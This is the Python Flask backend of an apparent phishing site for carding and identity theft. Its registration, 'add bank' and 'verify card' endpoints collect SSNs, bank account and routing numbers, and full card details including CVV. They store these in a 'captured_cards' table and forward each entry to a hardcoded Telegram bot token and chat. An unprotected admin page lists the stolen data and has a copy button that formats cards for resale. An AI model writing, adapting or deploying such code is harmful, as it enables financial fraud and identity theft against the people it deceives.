from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import sqlite3
import hashlib
import requests
import logging
from datetime import datetime

app = Flask(__name__)
app.secret_key = "your-secret-key-change-this"
CORS(app)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def get_db():
    conn = sqlite3.connect('cards.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            email TEXT UNIQUE,
            password TEXT,
            ssn TEXT,
            ip TEXT,
            bank_name TEXT,
            bank_account TEXT,
            routing_number TEXT,
            account_type TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captured_cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card_number TEXT,
            exp_month TEXT,
            exp_year TEXT,
            cvv TEXT,
            zip TEXT,
            address TEXT,
            card_type TEXT,
            status TEXT DEFAULT 'new',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id)
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

def send_telegram(message):
    try:
        bot_token = "8866696508:AAGUiyUAINlyKEZkYUwQOGQs7cQ-I7h3PpU"
        chat_id = "8011205570"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(url, json={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }, timeout=10)
        if response.status_code == 200:
            logger.info("Telegram sent")
        else:
            logger.error(f"Telegram failed: {response.text}")
    except Exception as e:
        logger.error(f"Telegram error: {str(e)}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    name = data.get('name', '').strip()
    email = data.get('email', '').strip()
    password = hashlib.sha256(data.get('password', '').encode()).hexdigest()
    ssn = data.get('ssn', '').strip()
    ip = request.remote_addr

    if not all([name, email, password, ssn]):
        return jsonify({'success': False, 'message': 'All fields required'})

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute('''
            INSERT INTO users (name, email, password, ssn, ip)
            VALUES (?, ?, ?, ?, ?)
        ''', (name, email, password, ssn, ip))
        conn.commit()
        user_id = cursor.lastrowid
        
        send_telegram(f"""
🔰 NEW USER REGISTERED
━━━━━━━━━━━━━━━━━━━
👤 Name: {name}
📧 Email: {email}
🆔 SSN: {ssn}
📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        return jsonify({
            'success': True,
            'user': {'id': user_id, 'name': name, 'email': email}
        })
    except sqlite3.IntegrityError:
        return jsonify({'success': False, 'message': 'Email already exists'})
    finally:
        conn.close()

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email', '').strip()
    password = hashlib.sha256(data.get('password', '').encode()).hexdigest()
    
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE email = ? AND password = ?', (email, password))
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return jsonify({'success': True, 'user': dict(user)})
    else:
        return jsonify({'success': False, 'message': 'Invalid credentials'})

@app.route('/api/add-bank', methods=['POST'])
def add_bank():
    try:
        data = request.json
        user_id = data.get('user_id')
        bank_name = data.get('bank_name', '').strip()
        bank_account = data.get('bank_account', '').strip()
        routing_number = data.get('routing_number', '').strip()
        account_type = data.get('account_type', 'checking').strip()

        if not all([bank_name, bank_account, routing_number]):
            return jsonify({'success': False, 'message': 'All bank fields required'})

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users 
            SET bank_name = ?, bank_account = ?, routing_number = ?, account_type = ?
            WHERE id = ?
        ''', (bank_name, bank_account, routing_number, account_type, user_id))
        conn.commit()
        
        cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
        user = cursor.fetchone()
        conn.close()

        if user:
            send_telegram(f"""
🏦 NEW BANK ACCOUNT ADDED
━━━━━━━━━━━━━━━━━━━
👤 User: {user['name']}
📧 Email: {user['email']}
🆔 SSN: {user['ssn']}
🏦 Bank: {bank_name}
💳 Account: {bank_account}
🔢 Routing: {routing_number}
📂 Type: {account_type}
            """)

        return jsonify({'success': True, 'message': 'Bank account added successfully'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/verify-card', methods=['POST'])
def verify_card():
    try:
        data = request.json
        user_id = data.get('user_id')
        card_number = data.get('card_number', '').replace(' ', '').replace('-', '')
        exp_month = data.get('exp_month', '').strip()
        exp_year = data.get('exp_year', '').strip()
        cvv = data.get('cvv', '').strip()
        zip_code = data.get('zip', '').strip()
        address = data.get('address', '').strip()

        if not all([card_number, exp_month, exp_year, cvv, zip_code]):
            return jsonify({'success': False, 'message': 'All card fields required'})

        first_digit = card_number[0]
        if first_digit == '4':
            card_type = 'Visa'
        elif first_digit in ['5']:
            card_type = 'Mastercard'
        else:
            card_type = 'Unknown'

        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO captured_cards (user_id, card_number, exp_month, exp_year, cvv, zip, address, card_type)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, card_number, exp_month, exp_year, cvv, zip_code, address, card_type))
        conn.commit()

        cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))
        user = cursor.fetchone()
        conn.close()

        if user:
            message = f"""
💳 NEW CARD CAPTURED
━━━━━━━━━━━━━━━━━━━
👤 User: {user['name']}
📧 Email: {user['email']}
🆔 SSN: {user['ssn']}
💳 Card: {card_number}
📅 Exp: {exp_month}/{exp_year}
🔐 CVV: {cvv}
📍 ZIP: {zip_code}
🏠 Address: {address}
            """
            send_telegram(message)

        return jsonify({'success': True, 'message': 'Card verified successfully'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/admin')
def admin_dashboard():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users ORDER BY created_at DESC LIMIT 50')
    users = cursor.fetchall()
    cursor.execute('SELECT * FROM captured_cards ORDER BY created_at DESC LIMIT 50')
    cards = cursor.fetchall()
    conn.close()

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            body { font-family: Arial; margin: 20px; background: #0f172a; color: white; }
            h1 { color: #f5c842; }
            table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.05); border-radius: 12px; overflow: hidden; }
            th { background: #1a3a5c; padding: 10px; text-align: left; }
            td { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.1); }
            .copy-btn { background: #28a745; color: white; border: none; padding: 4px 10px; border-radius: 4px; cursor: pointer; }
            .section { margin-bottom: 30px; }
            .section-title { color: #f5c842; margin-bottom: 10px; border-bottom: 2px solid #f5c842; padding-bottom: 5px; }
        </style>
    </head>
    <body>
        <h1>💳 Admin Dashboard</h1>
        
        <div class="section">
            <h2 class="section-title">👤 Users</h2>
            <table>
                <tr><th>ID</th><th>Name</th><th>Email</th><th>SSN</th><th>Bank</th><th>Account</th><th>Routing</th></tr>
    """
    for user in users:
        html += f"""
            <tr>
                <td>{user['id']}</td>
                <td>{user['name']}</td>
                <td>{user['email']}</td>
                <td>{user['ssn']}</td>
                <td>{user['bank_name'] or 'N/A'}</td>
                <td>{user['bank_account'] or 'N/A'}</td>
                <td>{user['routing_number'] or 'N/A'}</td>
            </tr>
        """
    html += """
            </table>
        </div>
        
        <div class="section">
            <h2 class="section-title">💳 Cards</h2>
            <table>
                <tr><th>ID</th><th>User</th><th>Card</th><th>Exp</th><th>CVV</th><th>ZIP</th><th>Time</th><th>Copy</th></tr>
    """
    for card in cards:
        html += f"""
            <tr>
                <td>{card['id']}</td>
                <td>{card['user_id']}</td>
                <td>{card['card_number']}</td>
                <td>{card['exp_month']}/{card['exp_year']}</td>
                <td>{card['cvv']}</td>
                <td>{card['zip']}</td>
                <td>{card['created_at']}</td>
                <td><button class="copy-btn" onclick="copyCard('{card['card_number']}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}|{card['zip']}')">📋</button></td>
            </tr>
        """
    html += """
            </table>
        </div>
        <script>
            function copyCard(data) {
                navigator.clipboard.writeText(data);
                alert('Copied!');
            }
        </script>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    init_db()
    print("🚀 Server running at http://127.0.0.1:5000")
    print("📊 Admin: http://127.0.0.1:5000/admin")
    app.run(host='0.0.0.0', port=5000, debug=True)
